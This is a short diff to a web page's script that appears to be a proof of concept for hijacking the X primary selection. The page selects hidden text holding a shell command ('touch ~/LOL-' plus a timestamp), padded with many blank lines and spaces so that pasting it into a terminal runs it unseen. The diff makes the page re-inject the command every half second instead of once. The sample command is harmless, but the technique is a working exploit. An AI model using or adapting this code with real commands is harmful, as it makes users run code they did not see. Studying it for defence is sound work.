@@ -8,10 +8,10 @@ intentionally left blank
 function writeXPrimary(s){
 	pre.textContent = s; getSelection().selectAllChildren(pre);
 }
-setTimeout(function(){
+setInterval(function(){
 	let payload = 'touch ~/LOL-' + Date.now() / 1000;
 	writeXPrimary('\n' + payload + '\n'.repeat(100) + ' '.repeat(30)
 		+ '\n'.repeat(100))
-}, 0);
+}, 500);
 </script>
 
